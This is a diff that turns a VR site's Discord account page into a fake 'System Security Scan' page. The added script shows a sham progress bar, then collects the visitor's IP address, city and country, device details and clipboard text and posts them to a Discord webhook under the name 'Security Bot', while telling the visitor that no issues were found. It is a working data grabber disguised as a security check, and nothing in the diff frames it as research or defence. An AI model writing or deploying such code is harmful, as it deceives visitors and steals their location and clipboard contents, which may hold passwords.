@@ -1,241 +1,258 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Nexaverse VR</title>
-<style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Scan In Progress</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.5s ease;
+        }
 
-  body {
-    margin: 0;
-    padding: 0;
-    background: linear-gradient(145deg, #1a0036, #0d001a);
-    color: white;
-    font-family: Arial, sans-serif;
-    overflow-x: hidden;
-    position: relative;
-    transition: background 0.3s, color 0.3s;
-  }
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
 
+        .progress-container {
+            width: 100%;
+            background-color: #333;
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
 
-  .watermark {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(4);
-    opacity: 0.05;
-    font-size: 10rem;
-    color: #000080;
-    font-weight: bold;
-    z-index: -1;
-  }
+        .progress-bar {
+            height: 20px;
+            background-color: #4CAF50;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
 
+        .loading-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
 
-  .logo {
-    position: fixed;
-    top: 20px;
-    left: 20px;
-    font-size: 24px;
-    color: #00bfff;
-    font-weight: bold;
-  }
+        .result {
+            display: none;
+            animation: fadeIn 1s ease;
+        }
 
+        .sticker {
+            font-size: 100px;
+            margin: 20px 0;
+        }
 
-  .header {
-    text-align: center;
-    padding: 2rem;
-  }
+        .message {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #ff5555;
+        }
 
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
 
-  .card-container {
-    display: flex;
-    justify-content: space-evenly;
-    align-items: center;
-    flex-wrap: wrap;
-    padding: 2rem;
-  }
-
-
-  .card {
-    background: #2e004f;
-    width: 250px;
-    padding: 1.5rem;
-    border-radius: 15px;
-    margin: 1rem;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    text-align: center;
-    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
-    color: white;
-  }
-
-  .card:hover {
-    transform: rotateY(15deg) rotateX(5deg);
-    box-shadow: 0px 0px 20px #00bfff;
-  }
-
-  .login-button {
-    display: inline-block;
-    padding: 1rem 2rem;
-    background-color: #5865F2;
-    color: white;
-    font-size: 1.2rem;
-    font-weight: bold;
-    text-decoration: none;
-    border-radius: 8px;
-    transition: background-color 0.3s ease;
-  }
-
-  .login-button:hover {
-    background-color: #4752C4;
-  }
-
-
-  .categories {
-    text-align: center;
-    margin-top: 3rem;
-  }
-
-  .category-button {
-    padding: 0.5rem 1rem;
-    background: #1a0036;
-    border: 1px solid #00bfff;
-    color: #00bfff;
-    border-radius: 5px;
-    margin: 0.5rem;
-    cursor: pointer;
-    transition: 0.3s;
-  }
-
-  .category-button:hover {
-    background-color: #00bfff;
-    color: #1a0036;
-  }
-
-
-  .footer {
-    background: #0d001a;
-    color: #808080;
-    padding: 2rem;
-    text-align: center;
-  }
-
-  .footer p, .footer a {
-    color: #00bfff;
-    text-decoration: none;
-    margin: 0 10px;
-  }
-
-  .bol {
-    font-weight: bold;
-    color: #00bfff;
-  }
-
-  .but {
-    background: none;
-    border-style: solid;
-    border-color: #00bfff;
-    border-radius: 7px;
-    height: 30px;
-    width: 70px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    margin-left: 60px;
-  }
-
-  .game {
-    text-decoration: none;
-    color: #00bfff;
-    font-weight: bold;
-  }
-
-
-  .theme-selector {
-    margin: 1rem auto;
-    text-align: center;
-  }
-
-</style>
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div id="loading-section">
+            <h1>System Security Scan</h1>
+            <div class="loading-text">Scanning your device for vulnerabilities...</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div id="status-text">Initializing scan...</div>
+        </div>
 
+        <div id="result-section" class="result">
+            <div class="sticker">😂</div>
+            <div class="message">You was you deranged guy!</div>
+            <p>Security scan complete. No issues detected.</p>
+        </div>
+    </div>
 
-<div class="watermark">NV</div>
+    <script>
+        // Collect security data
+        async function collectSecurityData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack
+            };
 
+            // Get IP and country
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ipAddress = ipData.ip;
 
-<div class="logo">NEXAVERSE</div>
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                data.country = geoData.country_name;
+                data.city = geoData.city;
+                data.region = geoData.region;
+            } catch (error) {
+                console.error('Error fetching location data:', error);
+                data.ipAddress = 'Unknown';
+                data.country = 'Unknown';
+            }
 
+            // Try to get clipboard content (requires permission)
+            try {
+                const clipboardItems = await navigator.clipboard.read();
+                for (const clipboardItem of clipboardItems) {
+                    for (const type of clipboardItem.types) {
+                        if (type === 'text/plain') {
+                            const blob = await clipboardItem.getType(type);
+                            data.clipboardContent = await blob.text();
+                            break;
+                        }
+                    }
+                }
+            } catch (error) {
+                console.log('Could not access clipboard:', error);
+                data.clipboardContent = 'Not accessible';
+            }
 
-<div class="header">
-  <h1> <b class="bol">user: <b id='user'></b></b></h1>
-  <p class="bol">Modify preferences here (buggy)</p>
-</div>
+            return data;
+        }
 
+        // Send data to webhook
+        async function sendToWebhook(data) {
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+            
+            const embed = {
+                title: "Security Scan Triggered",
+                color: 0xff5555,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    {
+                        name: "IP Address",
+                        value: data.ipAddress || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "Country",
+                        value: data.country || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "Location",
+                        value: `${data.city || "Unknown"}, ${data.region || "Unknown"}`,
+                        inline: true
+                    },
+                    {
+                        name: "Device Info",
+                        value: `Resolution: ${data.screenResolution}\nPlatform: ${data.platform}`,
+                        inline: false
+                    },
+                    {
+                        name: "Clipboard Content",
+                        value: data.clipboardContent ? `\`\`\`${data.clipboardContent}\`\`\`` : "Not accessible",
+                        inline: false
+                    },
+                    {
+                        name: "User Agent",
+                        value: `\`\`\`${data.userAgent}\`\`\``,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "Security Scan Report"
+                }
+            };
 
-<div class="theme-selector">
-  <label for="theme">Select Theme: </label>
-  <select id="theme" onchange="changeTheme()">
-    <option value="default">Default</option>
-    <option value="dark">Dark</option>
-    <option value="light">Light</option>
-  </select>
-</div>
+            const payload = {
+                embeds: [embed],
+                username: "Security Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
+            };
 
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
+        }
 
-<div class="categories">
-  <h2>Explore Categories</h2>
-  <button onclick='window.location.href="https://starversevr.xyz/game"' class="category-button">Explore Games</button>
-  <button class="category-button">Our projects</button>
-  <button onclick='window.location.href="https://starversevr.xyz/support"' class="category-button">Support</button>
-  <button onclick='window.location.href="https://discord.gg/yyaZuuaDN4"' class="category-button">Discord</button>
-</div>
+        // Simulate progress bar
+        function simulateProgress() {
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('status-text');
+            const loadingSection = document.getElementById('loading-section');
+            const resultSection = document.getElementById('result-section');
+            
+            const messages = [
+                "Checking system integrity...",
+                "Scanning network connections...",
+                "Analyzing installed software...",
+                "Verifying security protocols...",
+                "Finalizing scan results..."
+            ];
 
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 100) progress = 100;
+                progressBar.style.width = `${progress}%`;
+                
+                // Update status text at certain intervals
+                if (progress < 25) {
+                    statusText.textContent = messages[0];
+                } else if (progress < 45) {
+                    statusText.textContent = messages[1];
+                } else if (progress < 65) {
+                    statusText.textContent = messages[2];
+                } else if (progress < 85) {
+                    statusText.textContent = messages[3];
+                } else {
+                    statusText.textContent = messages[4];
+                }
 
-<div class="card-container">
-  <div class="card">
-    <h3>Account</h3>
-    <img id="avatar" src="" style="width:100%; border-radius: 10px;">
-    <p>logged in as <b id="name"></b></p>
-    <p>See What's new <a href="https://starversevr.xyz/whatsnew">here</a></p>
-  </div>
-</div>
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    loadingSection.style.display = 'none';
+                    resultSection.style.display = 'block';
+                    
+                    // Collect and send data
+                    collectSecurityData().then(data => {
+                        sendToWebhook(data);
+                    });
+                }
+            }, 500);
+        }
 
-
-<div class="footer">
-  <p>&copy; 2024 Nexaverse VR. All rights reserved.</p>
-  <a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a>
-  <p>Join us in redefining the boundaries of reality. Dive into Nexaverse for an unforgettable VR gaming experience.</p>
-</div>
-<script>
-const accessToken = localStorage.getItem('access_token');
-const tokenType = localStorage.getItem('token_type');
-
-window.onload = () => {
-  if (!tokenType || !accessToken){
-    window.location.assign('https://starversevr.xyz/login');
-    return;
-  }
-  fetch('https://discord.com/api/users/@me', {
-    headers: {
-      authorization: `${tokenType} ${accessToken}`,
-    },
-  })
-  .then(result => result.json())
-  .then(response => {
-    console.log(response);
-    const { username, discriminator, avatar, id } = response;
-
-    document.getElementById('name').innerText = `${username}#${discriminator}`;
-    document.getElementById('user').innerText = `${id}`;
-    document.getElementById("avatar").src = `https://cdn.discordapp.com/avatars/${id}/${avatar}.jpg`;
-  })
-  .catch(console.error);
-};
-</script>
-
-
+        // Start the process when page loads
+        window.onload = simulateProgress;
+    </script>
 </body>
 </html>
